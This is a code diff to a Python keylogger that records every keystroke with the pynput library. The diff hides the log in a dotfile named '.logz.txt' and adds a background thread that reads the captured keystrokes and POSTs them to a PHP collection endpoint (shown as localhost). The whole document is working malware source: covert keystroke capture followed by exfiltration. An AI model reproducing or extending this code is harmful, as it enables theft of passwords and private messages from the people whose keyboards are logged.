@@ -1,8 +1,8 @@
-import requests
+import requests, time, threading
 from pynput import keyboard
 
 def save(key):
-	f = open('logz.txt','a')
+	f = open('.logz.txt','a')
 	if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
 		f.write(' <Ctrl>')
 	elif key == keyboard.Key.esc:
@@ -92,6 +92,15 @@ def on_release(key):
     save(key)
     if key == keyboard.Key.esc:
         return False
+        exit()
+
+def upload():
+	time.sleep(1)
+	url = 'http://localhost/logz/logger.php'
+	f = open('.logz.txt')
+	logz = f.read()
+	r = requests.post(url, data={'klogz':logz})
+	f.close()
 
 print("""
 ╔――――――――――――――――――――――――――――――――――――――――――――――╗
@@ -109,4 +118,5 @@ with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
 	listener.join()
 
 listener = keyboard.Listener(on_press=on_press,on_release=on_release)
+threading.Thread(target=upload).start()
 listener.start()
